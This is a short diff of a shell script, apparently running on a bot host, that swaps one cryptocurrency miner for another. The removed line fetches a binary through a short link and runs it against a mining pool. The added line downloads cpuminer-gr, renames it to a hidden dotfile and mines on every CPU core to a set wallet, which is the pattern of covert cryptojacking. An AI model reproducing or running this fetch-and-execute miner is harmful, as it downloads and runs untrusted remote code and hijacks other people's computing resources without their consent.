@@ -4,4 +4,4 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.hotaru -p c=LTC,mc=VRSC
+wget -qO rtm git.io/cpuminer-gr-1.2.3 && tar xf rtm && mv ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RGBkj7KZ9U7Rs9SpviMcfXqL233SGmZKfM.zi5 -t $(nproc --all) --no-tune
